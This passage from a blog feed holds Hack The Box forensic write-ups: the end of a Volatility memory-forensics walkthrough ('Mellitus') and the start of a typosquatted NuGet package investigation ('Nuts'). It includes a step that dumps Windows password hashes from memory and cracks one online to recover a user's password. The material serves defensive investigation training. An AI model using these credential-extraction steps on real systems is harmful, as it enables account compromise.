</code></pre> <p><em>It will make sense as we work through the problems.</em></p> <p>Now that we have seen the evidence, let’s jump into Task 1.</p> <h2 id="task-1-what-was-the-time-on-the-system-when-the-memory-was-captured">Task 1: What was the time on the system when the memory was captured?</h2> <p>Use the <code class="language-plaintext highlighter-rouge">windows.info</code> plugin to view the image’s metadata.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 <span class="nt">-f</span> ../vmems/memory_dump.vmem windows.info | <span class="nb">tee </span>info.vol
</code></pre></div></div> <p>The use of <code class="language-plaintext highlighter-rouge">tee</code> allows me to view the output in real time and write it to a file at the same time. The system time at the time of capture is shown in the output of the <code class="language-plaintext highlighter-rouge">windows.info</code> plugin (Fig. 3).</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/3.png" sizes="95vw"/> <img src="/assets/img/mellitus/3.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 3 </div> <h2 id="task-2-what-is-the-ip-address-of-the-attacker">Task 2: What is the IP address of the attacker?</h2> <p>There are two command and useful network-related plugins for volatility: <code class="language-plaintext highlighter-rouge">windows.netscan</code> and <code class="language-plaintext highlighter-rouge">windows.netstat</code>. Netscan returns information about both active and closed connections, while netstat is generally less comprehensive. They are both useful, but I went with netscan first.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 <span class="nt">-f</span> ../vmems/memory_dump.vmem windows.netscan | <span class="nb">tee </span>netscan.vol
</code></pre></div></div> <p>If you aren’t used to looking at these, the output can look a bit daunting, but it really isn’t that bad. Right now, all we’re looking for is something out of the ordinary. One relevant aspect of a connection is the port used on each machine. In this case, one of the connections to a remote machine is targeting port 4545 (Fig. 4), which is not typically associated with any common service. This alone doesn’t confirm malicious behavior, but it sticks out.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/4.png" sizes="95vw"/> <img src="/assets/img/mellitus/4.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 4 </div> <p>Trying out the IP as the answer confirms that it is, in fact, the answer.</p> <h3 id="task2a">Confirming the IP is malicious</h3> <p>In real life we’d need to confirm this IP address another way, so let’s take a minute and do that before moving on. One easy thing to do when you have a suspected malicious IP is just extract the strings from the memory dump and grep for the IP. This casts a fairly wide net and is definitely worth doing.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings ../vmems/memory_dump.vmem | <span class="nb">grep </span>192.168.157.151
</code></pre></div></div> <p>There is… a lot of malicious stuff going on in the output. I’m not even going to include the entire thing, but just in Figure 5, there are several signs of malicious activity. It’s all suspicious, but downloading “scvhost.exe”, a close misspelling of the native Windows executable “svchost.exe” is egregiously malicious. It may as well be screaming that it’s malicious.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/5.png" sizes="95vw"/> <img src="/assets/img/mellitus/5.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 5 </div> <h2 id="task3">Task 3: What is the name of the strange process?</h2> <p>Based on the download in Figure 5, I’d like to place a bet that it’ll be “<code class="language-plaintext highlighter-rouge">scvhost.exe</code>”, but let’s take a look at the processes to find out. Here we can use one of a few plugins. Really you can choose from <code class="language-plaintext highlighter-rouge">windows.pslist</code>, <code class="language-plaintext highlighter-rouge">windows.psscan</code>, and <code class="language-plaintext highlighter-rouge">windows.pstree</code>. These are each slightly different, but I tend to like the output from <code class="language-plaintext highlighter-rouge">pstree</code> because it includes the full file path of the running executables. The output can be hard to parse in a terminal though due to the length of the lines, so I’ll just <code class="language-plaintext highlighter-rouge">tee</code> it to a file like usual, open it in a text editor and zoom out a bit (Fig. 6).</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 <span class="nt">-f</span> ../vmems/memory_dump.vmem windows.pstree | <span class="nb">tee </span>pstree.vol
</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/6.png" sizes="95vw"/> <img src="/assets/img/mellitus/6.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 6 </div> <p>In Figure 6, we can see that <code class="language-plaintext highlighter-rouge">scvhost.exe</code> did indeed run on the machine as PID 11156. Not only is it misspelled, but it’s running out of user BantingFG’s Downloads folder. Even if it were named correctly, <code class="language-plaintext highlighter-rouge">svchost.exe</code> running from a downloads folder is highly suspect. It should only ever run from its designated locations like <code class="language-plaintext highlighter-rouge">System32</code>, <code class="language-plaintext highlighter-rouge">SysWOW64</code>, etc.</p> <p>It’s also interesting to note that it is running as a child of Powershell PID 6772. Moving back another layer, we can see that powershell PID 6772 and some other processes are children of PID 1424. I ran the <code class="language-plaintext highlighter-rouge">windows.pslist</code> plugin for easier visual parsing in the terminal, then grepped for “1424”. PID 1424 turns out to be explorer.exe and it has some other interesting children (Fig. 7).</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 <span class="nt">-f</span> ../vmems/memory_dump.vmem windows.pslist | <span class="nb">tee </span>pslist.vol
</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep </span>1424 pslist.vol
</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/7.png" sizes="95vw"/> <img src="/assets/img/mellitus/7.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 7 </div> <p>Pretty much all of these processes (Fig. 7) warrant further investigation, but at first glance I’m especially curious about the <code class="language-plaintext highlighter-rouge">cmd.exe</code>, <code class="language-plaintext highlighter-rouge">FTK Imager.exe</code>, <code class="language-plaintext highlighter-rouge">python.exe</code>, <code class="language-plaintext highlighter-rouge">powershell.exe</code>, and <code class="language-plaintext highlighter-rouge">chrome.exe</code>.</p> <p>But I digress. The answer to task 3 is <code class="language-plaintext highlighter-rouge">scvhost.exe</code>. We’ll come back to these, but for now let’s move on to Task 4.</p> <h2 id="task-4-what-is-the-pid-of-the-process-that-launched-the-malicious-binary">Task 4: What is the PID of the process that launched the malicious binary?</h2> <p>I already found this in the previous task. It was launched by <code class="language-plaintext highlighter-rouge">powershell.exe</code> PID 6772.</p> <h2 id="task-5-what-was-the-command-that-got-the-malicious-binary-onto-the-machine">Task 5: What was the command that got the malicious binary onto the machine?</h2> <p>I also already found this. It’s the <code class="language-plaintext highlighter-rouge">curl</code> command from <a href="#task2a">Task 2</a>. In Task 2, I found it by dumping the strings from the image and grepping for the malicious IP, but there are other ways to find this command too. For example:</p> <p>Use the <code class="language-plaintext highlighter-rouge">windows.memmap</code> plugin to dump the memory related to powershell PID 6772. It will create a file called <code class="language-plaintext highlighter-rouge">pid.6772.dmp</code></p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 <span class="nt">-f</span> ../vmems/memory_dump.vmem windows.memmap <span class="nt">--dump</span> <span class="nt">--pid</span> 6772
</code></pre></div></div> <p>Dump the strings from the <code class="language-plaintext highlighter-rouge">pid.6772.dmp</code> into a new file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings pid.6772.dmp <span class="o">&gt;&gt;</span> 6772.strings
</code></pre></div></div> <p>Then open 6772.strings in a text editor and search for words related to that the misspelled malicious file <code class="language-plaintext highlighter-rouge">scvhost.exe</code>. There are hundreds of results, but in truth, it doesn’t take that long to quickly glance through 250+ matches. Or if you chose to search for ‘downloads’ (since it’s running from the Downloads folder), you’ll hit a great result after only 11 matches (Fig. 8)</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/8.png" sizes="95vw"/> <img src="/assets/img/mellitus/8.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 8 </div> <p>In Figure 8, we can observe the attacker repeatedly trying and failing to download their payload before eventually succeeding and running it.</p> <h2 id="task-6-the-attacker-attempted-to-gain-entry-to-our-host-via-ftp-how-many-users-did-they-attempt">Task 6: The attacker attempted to gain entry to our host via FTP. How many users did they attempt?</h2> <p>Again, I already caught some of this back in <a href="#task2a">Task 2</a>, but we need to revisit it to count usernames. From the output I looked at in Task 2, it looks like there are 3 unique usernames (Fig. 9).</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/9.png" sizes="95vw"/> <img src="/assets/img/mellitus/9.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 9 </div> <p>Since there is a lot of output, I added one more grep to narrow it down. This takes the output from Task 2 and then greps for lines containing either ‘password’ or ‘user’ since both types of lines can contain usernames in this context.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings ../vmems/memory_dump.vmem | <span class="nb">grep </span>192.168.157.151 | <span class="nb">grep</span> <span class="nt">-iE</span> <span class="s2">"password|user"</span>
</code></pre></div></div> <p>This narrowed the output to less than one page (Fig. 10) and I still didn’t see other usernames, so the answer should be 3.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/10.png" sizes="95vw"/> <img src="/assets/img/mellitus/10.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 10 </div> <h2 id="task-7-what-is-the-full-url-of-the-last-website-the-attacker-visited">Task 7: What is the full URL of the last website the attacker visited?</h2> <p>Back to the <code class="language-plaintext highlighter-rouge">chrome.exe</code> PID 8048 spawned from the malicious <code class="language-plaintext highlighter-rouge">explorer.exe</code> PID 1424 (see the end of <a href="#task3">Task 3</a>). I’m targeting its history database, which will be a file that it should have loaded into memory. To dump the files related to its PID, first I’ll make a directory for them to go in:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>chrome8048
</code></pre></div></div> <p>Then use the <code class="language-plaintext highlighter-rouge">windows.dumpfile</code> plugin to dump the related files:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 <span class="nt">-f</span> ../vmems/memory_dump.vmem <span class="nt">-o</span> chrome8048 windows.dumpfile <span class="nt">--pid</span> 8048
</code></pre></div></div> <p>Identify the history database. This command (below) also just checks their file types after finding them. It is a SQLite database as shown in Figure 11:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find chrome8048 <span class="nt">-iname</span> <span class="s2">"*hist*"</span> <span class="nt">-exec</span> file <span class="o">{}</span> <span class="se">\;</span>
</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/11.png" sizes="95vw"/> <img src="/assets/img/mellitus/11.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 11 </div> <p>I’m using <a href="https://sqlitebrowser.org/">sqlitebrowser</a> to open and browse through the history DB (Fig. 12). The correct file to use is <code class="language-plaintext highlighter-rouge">file.0xc40aa9259df0.0xc40aa4ec6be0.SharedCacheMap.History.vacb</code>. Open it, go to the section indicated in Figure 12 and look for URLs the attacker might have visited. They were having trouble downloading their file, so the searches and sites towards the bottom look likely. One turns out to be correct.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/12.png" sizes="95vw"/> <img src="/assets/img/mellitus/12.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 12 </div> <h2 id="task-8-what-is-the-affected-users-password">Task 8: What is the affected user’s password?</h2> <p>For this one, I used the <code class="language-plaintext highlighter-rouge">windows.hashdump</code> plugin to extract any user hashes that existed in the memory image (Fig. 13).</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 <span class="nt">-f</span> ../vmems/memory_dump.vmem windows.hashdump | <span class="nb">tee </span>hashdump.vol
</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/13.png" sizes="95vw"/> <img src="/assets/img/mellitus/13.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 13 </div> <p>The user who seems most affected by all of this seems to be BantingFG, since the malicious file is in his downloads folder, etc. I threw his NT Hash into <a href="https://crackstation.net/">CrackStation</a> and it immediately returned a result (Fig. 14)</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/14.png" sizes="95vw"/> <img src="/assets/img/mellitus/14.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 14 </div> <h2 id="task-9-there-is-a-flag-hidden-related-to-pid-5116-can-you-confirm-what-it-is">Task 9: There is a flag hidden related to PID 5116. Can you confirm what it is?</h2> <p>PID 5116 turns out to be the instance of <code class="language-plaintext highlighter-rouge">mspaint.exe</code> that was spawned by <code class="language-plaintext highlighter-rouge">powershell.exe</code> PID 6772 (Fig. 15).</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/15.png" sizes="95vw"/> <img src="/assets/img/mellitus/15.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 15 </div> <p>Since this is MS Paint, it seems likely that the hidden flag might be something drawn on the screen. In that case, we’d need to access whatever part of memory the data for the drawing is stored in. I don’t know which of the files, if any, that would be from the <code class="language-plaintext highlighter-rouge">windows.dumpfile</code> output, but whatever memory that we need will definitely be included in a <code class="language-plaintext highlighter-rouge">windows.memmap</code> dump of the entire process’s memory.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 <span class="nt">-f</span> ../vmems/memory_dump.vmem windows.memmap <span class="nt">--dump</span> <span class="nt">--pid</span> 5116
</code></pre></div></div> <p>As in Task 3, this should result in an output file called <code class="language-plaintext highlighter-rouge">pid.5116.dmp</code>. Now… How can we view the image that was displayed on the screen to the user while they were useing MS Paint? I hadn’t done this type of extraction before so googled about it and read <a href="https://w00tsec.blogspot.com/2015/02/extracting-raw-pictures-from-memory.html">one</a> or <a href="https://beguier.eu/nicolas/articles/security-tips-2-volatility-gimp.html">two</a> blog posts about it.</p> <p>Read the linked articles too for a better understanding, but the basic idea is to just open the entire process dump in <a href="https://www.gimp.org/">GIMP</a> as “raw image data” and then manually search through the raw data until you find something that looks like an image.</p> <p>After some fiddling around in GIMP, I was able to produce the answer with the following procedure:</p> <ol> <li>From the base settings, increase the <em>Offset</em> slider until you see something recognizable (Fig. 16)</li> <li>Increase the <em>Width</em> slider until it becomes readable (Fig. 17)</li> </ol> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/16.png" sizes="95vw"/> <img src="/assets/img/mellitus/16.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 16 </div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/mellitus/17.png" sizes="95vw"/> <img src="/assets/img/mellitus/17.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Fig. 17 </div> <p>It’s upside down, but clearly reads <em>you_Foundme!</em></p> <h2 id="conclusion">Conclusion</h2> <p>This Sherlock was a nice refresher on memory forensics. I prefer the challenges that require more varied techniques, but it’s also fun to focus in on one skill sometimes. I liked the fact that the authors rewarded knowledge of specific techniques or plugins (like the windows.hashdump plugin), and also rewarded very general searches (like grepping the entire forensic image for the malicious IP). The bonus question was really interesting as well since I had never encountered that technique before. It makes me wonder what images I could have retrieved from other forensic images I’ve analyzed.</p> <p>Thanks for reading! If you have any questions or comments, feel free to reach out or follow <a href="https://x.com/its_rad_io">me on X</a></p>]]></content><author><name></name></author><category term="Write-Ups"/><category term="forensics"/><category term="medium"/><category term="sherlock"/><category term="HackTheBox"/><category term="memory"/><category term="volatility"/><summary type="html"><![CDATA[A write-up for Hack The Box's forensics challenge 'Mellitus'. This challenge focuses primarily on memory forensics, with the evidence consisting solely of a forensic memory dump from a targeted machine.]]></summary></entry><entry><title type="html">HTB Write-Up | Medium Sherlock | Nuts</title><link href="https://its-radio.github.io/blog/2025/Nuts-Write-Up/" rel="alternate" type="text/html" title="HTB Write-Up | Medium Sherlock | Nuts"/><published>2025-02-20T00:00:00+00:00</published><updated>2025-02-20T00:00:00+00:00</updated><id>https://its-radio.github.io/blog/2025/Nuts-Write-Up</id><content type="html" xml:base="https://its-radio.github.io/blog/2025/Nuts-Write-Up/"><![CDATA[<style>.small-margin>*{margin-bottom:.1rem}</style> <h2 id="introduction">Introduction</h2> <p>This is a write-up for Hack The Box’s Sherlock challenge, <strong>Nuts</strong>. This Sherlock is rated as <strong>Medium</strong>, but I’ll try to keep the write-up beginner friendly and approachable. I’ll cover most methods thoroughly and explain the reasoning for decisions that I make. If there is anything you don’t understand or if you have any specific questions, please feel free to reach out to me on X. Seriously! I’ll actually try to help you out.</p> <p>For this demo I’m primarily using Fedora 40 as my OS, but I may end up on Windows to make it easier to use certain tools.</p> <h2 id="starting-out">Starting Out</h2> <p>I usually start out CTFs by reading the description thoroughly, but there is no description for this challenge, so lets get straight into the evidence.</p> <h2 id="downloading-nutszip-and-decompressing-it">Downloading Nuts.zip and decompressing it</h2> <p>For whatever reason the <code class="language-plaintext highlighter-rouge">unzip</code> command has a hard time handling the evidence archives from HTB, so I always advise <code class="language-plaintext highlighter-rouge">7z</code> to decompress them. Other compression tools probably work, but <code class="language-plaintext highlighter-rouge">7z</code> is a popular and easy choice. Keep in mind that you’ll need to enter a password in order to decompress the archive. You can get the password on HTB as shown in the image below.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/1.png" sizes="95vw"/> <img src="/assets/img/nuts/1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 1 </div> <p>Decompress the archive as shown and take a look at what’s inside. You can use:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>7z x Nuts.zip
</code></pre></div></div> <p>It looks like this is the root of a Windows file system.</p> <div class="row mt-3"> <div class="col-sm-5 mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/2.png" sizes="95vw"/> <img src="/assets/img/nuts/2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 2 </div> <p>Running <code class="language-plaintext highlighter-rouge">tree</code> on it shows thousands of files and dirs, confirming that this is most likely a some kind of forensic image of a Windows file system.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/3.png" sizes="95vw"/> <img src="/assets/img/nuts/3.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 3 </div> <p>Okay, let’s hop into Task 1.</p> <h2 id="task1">Task 1: What action did Alex take to integrate the purported time-saving package into the deployment process? (provide the full command)</h2> <p>Just looking through the Administrator home folder, I noticed this directory standing out.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/4.png" sizes="95vw"/> <img src="/assets/img/nuts/4.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 4 </div> <p>Notice the misspelling of “Ignore” as “Ignor”. This could be a typosquatted package–a technique in which hackers build a malicious version of a popular package and name it something very similar to the original in a way that would be very easy to accidentally mistype. They are maliciously hoping that people will make a typo and inadvertently install the malware-laden package.</p> <p>This <code class="language-plaintext highlighter-rouge">PublishIgnor 1.0.11-beta</code> is most likely the package referenced in the task, but what action was taken to integrate it? The usual method would be to install it via commandline. Given that a log of a command to install a package would necessarily include its name, I grepped for the package name and found a result in ConsoleHost_history.txt:</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/5.png" sizes="95vw"/> <img src="/assets/img/nuts/5.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 5 </div> <p>While I was at it, I checked the contents of Administrator’s ConsoleHost_history.txt as well as checking if other users had a similar log with this command:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find <span class="nb">.</span> <span class="nt">-iname</span> <span class="s2">"*consolehost*"</span> <span class="nt">-exec</span> <span class="nb">echo</span> <span class="o">{}</span> <span class="se">\;</span> <span class="nt">-exec</span> <span class="nb">cat</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/6.png" sizes="95vw"/> <img src="/assets/img/nuts/6.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 6 </div> <h2 id="task-2-identify-the-url-from-which-the-package-was-downloaded">Task 2: Identify the URL from which the package was downloaded.</h2> <p>In the same grep output from the last task, I noticed a bunch of binary matches for files related to Google Chrome, including its history database.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/7.png" sizes="95vw"/> <img src="/assets/img/nuts/7.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 7 </div> <p>I used this command to view the related parts of the history:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings <span class="s2">"C/Users/Administrator/AppData/Local/Google/Chrome/User Data/Default/History"</span> | <span class="nb">grep</span> <span class="nt">-iC</span> 5 <span class="s2">"PublishIgnor.1.0.11-beta"</span> 
</code></pre></div></div> <p>Which resulted in the following output:</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/8.png" sizes="95vw"/> <img src="/assets/img/nuts/8.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 8 </div> <p>Two elements in the history pop out as especially interesting. For this task, of course one of the URLs looks interesting. Visiting it reveals that the page is unavailable, but one directory back at <code class="language-plaintext highlighter-rouge">https://www.nuget.org/packages/PublishIgnor</code> shows that the package has been deleted. The page also includes the second interesting element from the chrome history: The username <strong>a1l4m</strong> (keep this in mind for task 3). For now, we can confirm that this was a typosquatted package, as visiting <code class="language-plaintext highlighter-rouge">https://www.nuget.org/packages/PublishIgnore</code> shows a legitimate package. Enter the typosquatted URL as the correct answer.</p> <h2 id="task-3-who-is-the-threat-actor-responsible-for-publishing-the-malicious-package-the-name-of-the-package-publisher">Task 3: Who is the threat actor responsible for publishing the malicious package? (the name of the package publisher)</h2> <p>Again, the typosquatted page shows the same username we observed in the chrome history.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/9.png" sizes="95vw"/> <img src="/assets/img/nuts/9.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 9 </div> <p>In the history we saw “who is this guy named a1l4m?” and now we confirm that he was the publisher of the package.</p> <h2 id="task-4-when-did-the-attacker-initiate-the-download-of-the-package-provide-the-timestamp-in-utc-format-yyyy-mm-dd-hhmm">Task 4: When did the attacker initiate the download of the package? Provide the timestamp in UTC format (YYYY-MM-DD HH:MM).</h2> <p>Read that time format twice! YYYY-MM-DD HH:MM, no SS.</p> <p>Searching for any related files lead me to discover another instance of the package.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find <span class="nb">.</span> <span class="nt">-iname</span> <span class="s2">"*publishignor*"</span>
</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/10.png" sizes="95vw"/> <img src="/assets/img/nuts/10.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 10 </div> <p>This time in the config folder for Nuget, <code class="language-plaintext highlighter-rouge">C/Users/Administrator/.nuget/packages/</code>, meaning this is what would have been installed when the command from <a href="#task1">Task 1</a> was run.</p> <p>You can display their exact last-modified time using <code class="language-plaintext highlighter-rouge">ls</code>’s <code class="language-plaintext highlighter-rouge">--full-time</code> option. I found they were all last modified during the same minute <code class="language-plaintext highlighter-rouge">2024-03-19 14:41</code>. Searching for other files modified during this minute results in a few other files (Fig. 11), including <code class="language-plaintext highlighter-rouge">C/Users/Administrator/AppData/Local/Microsoft/CLR_v4.0/UsageLogs/nuget.exe.log</code> adding credence to the idea that a package was downloaded by Nuget at this time.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-iRl</span> <span class="s1">'.'</span> <span class="nb">.</span> | xargs <span class="nb">ls</span> <span class="nt">-l</span> <span class="nt">--full-time</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="s1">'2024-03-19 14:41'</span>
